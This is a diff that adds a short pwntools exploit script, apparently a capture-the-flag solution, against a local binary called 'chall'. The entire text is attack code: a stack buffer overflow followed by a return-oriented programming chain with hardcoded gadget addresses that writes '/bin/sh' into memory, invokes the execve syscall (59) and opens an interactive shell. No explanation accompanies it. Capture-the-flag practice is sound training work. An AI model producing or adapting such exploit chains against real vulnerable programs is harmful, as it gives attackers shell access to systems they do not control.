@@ -1,0 +1,13 @@
+from pwn import *
+p=process('./chall')
+p.sendline(b'0')
+payload=b'a'*40+p64(0x000000000040077f)+p64(0)+p64(0x0000000000400791)+p64(0x0000000000601000)+p64(0x0000000000400788)+p64(0x8)
+payload+=p64(0x00000000004007a3)+p64(0)+p64(0x000000000040059e)+p64(0x4007a8)
+#input()
+p.send(payload)
+p.send(b'/bin/sh')
+payload=b'a'*41+p64(0x000000000040077f)+p64(0x601000)+p64(0x0000000000400791)+p64(0)+p64(0x0000000000400788)+p64(0)
+payload+=p64(0x000000000040079a)+p64(59)+p64(0x00000000004007a3)
+#input()
+p.send(payload)
+p.interactive()
